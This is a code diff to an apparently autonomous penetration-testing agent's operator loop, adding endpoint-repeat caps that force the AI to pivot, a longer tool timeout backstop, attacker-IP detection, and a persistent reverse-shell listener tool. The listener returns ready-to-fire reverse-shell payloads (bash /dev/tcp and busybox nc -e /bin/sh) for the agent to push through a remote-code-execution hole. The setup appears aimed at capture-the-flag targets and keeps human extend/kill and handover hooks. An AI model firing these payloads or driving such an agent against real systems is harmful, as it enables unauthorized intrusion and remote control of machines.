@@ -28,6 +28,7 @@ Design contracts:
 from __future__ import annotations
 
 import asyncio
+import hashlib
 import os
 import re
 import time
@@ -150,6 +151,12 @@ class OperatorCore:
         # fire it when max_iters=60 cut it off one step short.)
         self._iter_ceiling = int(os.environ.get(
             "ARGUS_OPERATOR_ITER_CEILING", str(self.max_iters * 4)))
+        # Per-tool wait BACKSTOP (seconds).  A tool's own `timeout` drives the
+        # human extend/kill prompt; this large ceiling only stops a TRULY frozen
+        # process from wedging the loop forever when nobody is watching.  It must
+        # be comfortably larger than any normal tool so it never pre-empts the
+        # human prompt — taking time is not failing.
+        self._tool_wait_ceiling = int(os.environ.get("ARGUS_OPERATOR_TOOL_CEILING_SEC", "1800"))
         self._compact_threshold = int(os.environ.get("ARGUS_OPERATOR_COMPACT_CHARS", "48000"))
         self._keep_recent = int(os.environ.get("ARGUS_OPERATOR_KEEP_RECENT", "8"))
         # Per-call wall-clock ceiling so a hung subprocess provider (e.g. a
@@ -181,6 +188,20 @@ class OperatorCore:
         self._consec_banned = 0
         self._method_max_tries = max(3, min(5, int(
             os.environ.get("ARGUS_OPERATOR_METHOD_MAX_TRIES", "4"))))
+        # Per-ENDPOINT repeat cap for actions that declare NO hypothesis/CVE
+        # (so _method_signature is empty and the method-ban path above can't
+        # see them).  This is the gap that let the operator hammer ONE http
+        # endpoint ~149× with payload tweaks for 144 min and never pivot:
+        # bare `http`/tool requests skipped method accounting entirely.
+        # Key: structural "(tool|METHOD|normalized-url)"; value: [attempts,
+        # last_response_hash].  Content-agnostic — derived from the URL the
+        # action targets, never from any payload/weakness content.  A
+        # productive round (new shell/flag/cred/vuln) clears the counter, so
+        # a genuinely-progressing multi-step exploit is never penalised.
+        self._endpoint_attempts: Dict[str, List[Any]] = {}
+        self._banned_endpoints: set = set()
+        self._endpoint_max_repeats = max(2, min(6, int(
+            os.environ.get("ARGUS_OPERATOR_ENDPOINT_MAX_REPEATS", "3"))))
         # Holistic engine spine: surface model + objective-aware hypothesis
         # backlog (built lazily once intel + objective are known).
         self._surface = None
@@ -463,14 +484,18 @@ class OperatorCore:
             # action belongs to an already-exhausted method, refuse it and force
             # a pivot to a different avenue.
             _sig = self._method_signature(reply, action)
-            if _sig and _sig in self._banned_methods:
+            _ep  = self._endpoint_signature(tool, action.get("args") or {})
+            _method_banned   = bool(_sig) and _sig in self._banned_methods
+            _endpoint_banned = bool(_ep)  and _ep  in self._banned_endpoints
+            if _method_banned or _endpoint_banned:
                 self._consec_banned += 1
+                _what = _sig if _method_banned else _ep.split("|", 1)[-1]
                 self.transcript.append({"role": "assistant", "content": reply})
                 self.transcript.append({"role": "user", "content":
-                    f"BLOCKED: method '{_sig}' is EXHAUSTED — it already failed "
-                    f"{self._method_max_tries}+ times with no new access and is "
-                    "off the table. Do NOT propose it again. Pick a DIFFERENT "
-                    "avenue now:\n" + self._pivot_suggestions()})
+                    f"BLOCKED: '{_what}' is EXHAUSTED — it already failed "
+                    "repeatedly with no new access and is off the table. Do NOT "
+                    "propose it again. Pick a DIFFERENT avenue now:\n"
+                    + self._pivot_suggestions()})
                 if self._consec_banned >= 6:
                     done_reason = "methods_exhausted"; break
                 continue
@@ -534,6 +559,44 @@ class OperatorCore:
                         await self._reason(
                             f"Method {_sig} exhausted ({self._method_tries[_sig]} "
                             "failed tries) — banned; forcing a pivot to a new avenue.")
+            elif _ep:
+                # No declared method/CVE — fall back to STRUCTURAL (tool,
+                # endpoint) repeat detection so a bare http/tool loop against
+                # ONE endpoint still gets capped and forced to pivot.  A
+                # productive round clears the counter; otherwise we strike,
+                # noting when the response is byte-for-byte identical (the
+                # clearest "this endpoint isn't budging" signal).
+                if self._stale_rounds == 0:
+                    self._endpoint_attempts.pop(_ep, None)
+                else:
+                    _rhash = hashlib.sha1(
+                        re.sub(r"\s+", " ", (observation or "")).strip()
+                        .lower()[:2000].encode("utf-8", "replace")).hexdigest()[:12]
+                    _prev = self._endpoint_attempts.get(_ep) or [0, ""]
+                    _attempts  = int(_prev[0]) + 1
+                    _identical = (_rhash == _prev[1])
+                    self._endpoint_attempts[_ep] = [_attempts, _rhash]
+                    if (_attempts >= self._endpoint_max_repeats
+                            and _ep not in self._banned_endpoints):
+                        self._banned_endpoints.add(_ep)
+                        _ident_note = (" The response has been IDENTICAL every "
+                                       "time — the endpoint is not budging."
+                                       if _identical else "")
+                        self.transcript.append({"role": "user", "content":
+                            f"DIRECTIVE — you have hit the same endpoint "
+                            f"({_ep.split('|', 1)[-1]}) {_attempts} times with no "
+                            f"new access, flag, or credential.{_ident_note} A real "
+                            "tester does NOT keep tweaking one request that isn't "
+                            "working. STOP hitting this endpoint and PIVOT to a "
+                            "different avenue:\n" + self._pivot_suggestions()})
+                        await self._emit("operator_endpoint_banned", {
+                            "session_id": self._session_id, "endpoint": _ep,
+                            "attempts": _attempts, "identical": _identical})
+                        await self._reason(
+                            f"Endpoint {_ep.split('|', 1)[-1]} exhausted "
+                            f"({_attempts} non-productive hits"
+                            f"{', identical responses' if _identical else ''}) — "
+                            "forcing a pivot to a new avenue.")
             # Holistic engine: rebuild the surface model + regenerate the
             # objective-aware hypothesis backlog from whatever new surface this
             # action revealed (idempotent; dedups by node+class).
@@ -587,6 +650,8 @@ class OperatorCore:
                 return self._do_note(args)
             if tool == "submit_flag":
                 return self._do_submit_flag(args)
+            if tool == "listener":
+                return await self._do_listener(args)
             if tool == "handover":
                 return await self._do_handover(args)
             if tool == "loot_hunt":
@@ -660,19 +725,28 @@ class OperatorCore:
 
     async def _dispatch_bounded(self, *, tool: str, args: str, purpose: str,
                                 phase: str, timeout: int):
-        """Dispatch a tool with a HARD wall-clock ceiling so a pathological
-        command (e.g. a greedy grep that ran 504s) can never freeze the loop.
-        asyncio.wait_for unblocks the operator even if the MCP subprocess lingers."""
+        """Dispatch a tool.  The per-call `timeout` drives the tool's watchdog —
+        which PROMPTS THE HUMAN (extend / kill) when a tool exceeds its expected
+        runtime — and a tool is stopped only by the human, a real error, or
+        completion.  Taking time is NOT failing, so this wait is bounded only by a
+        large BACKSTOP ceiling (ARGUS_OPERATOR_TOOL_CEILING_SEC, default 30 min):
+        it exists purely so a TRULY frozen process can't wedge the loop forever
+        when no human is watching — it must not pre-empt the extend/kill prompt.
+        A human 'kill' returns immediately (the tool task is cancelled), and a
+        human 'extend' keeps it running within this ceiling."""
+        _ceiling = max(int(timeout) + 30, int(getattr(self, "_tool_wait_ceiling", 1800)))
         try:
             return await asyncio.wait_for(
                 self.master._dispatch_to_agent(
                     tool=tool, args=args, purpose=purpose,
                     phase=phase, timeout=timeout),
-                timeout=timeout + 30)
+                timeout=_ceiling)
         except asyncio.TimeoutError:
-            return {"stdout": "", "stderr": (f"[operator] killed: '{tool}' exceeded "
-                    f"{timeout + 30}s wall-clock — choose a faster/narrower command."),
-                    "exit_code": -1, "error": "timeout"}
+            return {"stdout": "", "stderr": (f"[operator] backstop: '{tool}' ran past the "
+                    f"{_ceiling}s safety ceiling with no completion and no human "
+                    "extend/kill — moving on. (Raise ARGUS_OPERATOR_TOOL_CEILING_SEC "
+                    "if this tool legitimately needs longer.)"),
+                    "exit_code": -1, "error": "backstop_ceiling"}
         except Exception as exc:   # noqa: BLE001
             return {"stdout": "", "stderr": f"{type(exc).__name__}: {exc}",
                     "exit_code": -1, "error": str(exc)}
@@ -757,6 +831,98 @@ class OperatorCore:
                 if isinstance(c, dict) and (c.get("pass") or c.get("password")):
                     return c.get("pass") or c.get("password")
         return pw
+
+    def _detect_tun0_ip(self) -> str:
+        """Best-effort attacker IP for reverse-shell payloads — the VPN/tun0
+        address.  Returns '' if it can't be determined."""
+        try:
+            import subprocess as _sp
+            for dev in ("tun0", "tun1", "eth0"):
+                try:
+                    out = _sp.run(["ip", "-4", "addr", "show", dev],
+                                  capture_output=True, text=True, timeout=4).stdout
+                except Exception:
+                    continue
+                m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out or "")
+                if m:
+                    return m.group(1)
+        except Exception:
+            pass
+        return ""
+
+    async def _do_listener(self, args: Dict[str, Any]) -> str:
+        """Open a PERSISTENT reverse-shell / callback listener via the platform's
+        ShellAgent.
+
+        This is the fix for the recurring 'cannot catch a shell' failure: a
+        hand-rolled `nc -lvnp &` inside a bash tool call is SIGTERM'd (-15) the
+        instant the call returns, so a blind RCE's callback is never caught.  The
+        ShellAgent listener is a managed, PTY-backed socat listener that survives
+        across actions and auto-registers the shell that connects back.  It is
+        NOT gated on a confirmed foothold (you open it BEFORE firing a blind RCE).
+        Returns LHOST/LPORT + ready-to-fire payloads.  Best-effort; never raises."""
+        sa = getattr(self.master, "_shell_agent", None)
+        if sa is None or not hasattr(sa, "create_listener"):
+            return ("listener: no managed shell channel on this host. Run the "
+                    "reverse-shell listener in a separate terminal manually, then "
+                    "fire the payload through your RCE.")
+        import uuid as _uuid
+        try:
+            lport = int(args.get("port") or args.get("lport")
+                        or os.environ.get("ARGUS_LPORT", "4444"))
+        except Exception:
+            lport = 4444
+        # LHOST: explicit arg > intel > env > ShellAgent autodetect > tun0 probe.
+        lhost = (str(args.get("lhost") or args.get("ip") or "").strip()
+                 or str(self._intel.get("attacker_ip") or "").strip()
+                 or os.environ.get("ARGUS_LHOST", "").strip())
+        if not lhost:
+            try:
+                _gl = getattr(sa, "_get_lhost", None)
+                if callable(_gl):
+                    lhost = (_gl() or "").strip()
+            except Exception:
+                lhost = ""
+        if not lhost or lhost.count(".") != 3:
+            lhost = self._detect_tun0_ip() or "<your-VPN-ip>"
+
+        sid = f"lst{self._iteration}_{_uuid.uuid4().hex[:8]}"
+        try:
+            import db.mongo_client as _db
+            doc = await _db.create_shell_session(
+                session_id=self._session_id, shell_type="reverse_shell",
+                rhost=self._target, lport=lport)
+            sid = str(doc.get("_id") or doc.get("id") or sid)
+        except Exception:
+            pass
+        try:
+            await sa.create_listener(
+                self._session_id, sid, "reverse_shell", lport,
+                lhost=(lhost if lhost.count(".") == 3 else None))
+        except Exception as exc:   # noqa: BLE001
+            return (f"listener: failed to open on :{lport} ({type(exc).__name__}: {exc}). "
+                    "Try a different port (e.g. 9001) or check the Shell Manager.")
+        self._intel["listener_ready"] = {"sid": sid, "lhost": lhost, "lport": lport}
+        try:
+            await self._emit("shell_handover", {
+                "session_id": self._session_id, "shell_id": sid,
+                "mode": "listener", "lhost": lhost, "lport": lport})
+        except Exception:
+            pass
+        await self._reason(
+            f"Persistent listener open on :{lport} (LHOST {lhost}). Fire the "
+            "reverse-shell payload through the RCE now — the caught shell registers itself.")
+        return (f"LISTENER OPEN — persistent PTY listener on 0.0.0.0:{lport} "
+                f"(survives across actions; appears in the Shell Manager). "
+                f"LHOST={lhost} LPORT={lport}.\n"
+                f"Fire ONE of these through your RCE primitive to catch a shell:\n"
+                f"  bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n"
+                f"  bash -c 'sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n"
+                f"  busybox nc {lhost} {lport} -e /bin/sh\n"
+                "Do NOT run `nc -lvnp` yourself. After firing, the caught shell "
+                "registers automatically — continue and check your next output / "
+                "the Shell Manager. (If your RCE returns output inline, you can "
+                "instead just read the flag directly through it — no shell needed.)")
 
     async def _do_handover(self, args: Dict[str, Any]) -> str:
         """Hand the live foothold to the HUMAN operator inside ARGUS.
@@ -2223,6 +2389,42 @@ class OperatorCore:
         if m:
             return "cve:" + m.group(0).upper()
         return ""
+
+    def _endpoint_signature(self, tool: str, args: Dict[str, Any]) -> str:
+        """A STRUCTURAL (tool, endpoint) key for repeat-detection on actions
+        that carry no declared hypothesis/CVE (so _method_signature is empty).
+
+        Content-agnostic by design: the key is derived from the URL / host the
+        action targets — never from any payload, body, or weakness content — so
+        the engine stays free of hardcoded attack knowledge.  Query strings and
+        fragments are stripped so the same endpoint hit with tweaked params (the
+        exact 149× loop we are guarding against) collapses to one key.  Returns
+        '' for non-network actions (dispatch/converse/note/done) and for
+        anything with no resolvable URL — those are never endpoint-capped."""
+        if not isinstance(args, dict) or not tool:
+            return ""
+        t = (tool or "").strip().lower()
+        if t in ("dispatch", "converse", "note", "done", "reason", "think", "wait"):
+            return ""
+        url = ""
+        for k in ("url", "target_url", "endpoint", "uri"):
+            v = args.get(k)
+            if v:
+                url = str(v); break
+        if not url:
+            # Mine a URL out of a command/payload string (curl/wget/etc.).
+            blob = " ".join(str(args.get(k, "")) for k in
+                            ("cmd", "command", "args", "payload", "data"))
+            m = re.search(r"https?://[^\s'\"]+", blob)
+            if m:
+                url = m.group(0)
+        if not url:
+            return ""
+        u = re.sub(r"[#?].*$", "", url).rstrip("/").lower()
+        if not u:
+            return ""
+        method = str(args.get("method") or "").upper()
+        return f"{t}|{method}|{u}"
 
     def _backlog_brief(self, top_n: int = 8) -> str:
         """Render the prioritized hypothesis backlog + coverage for injection into
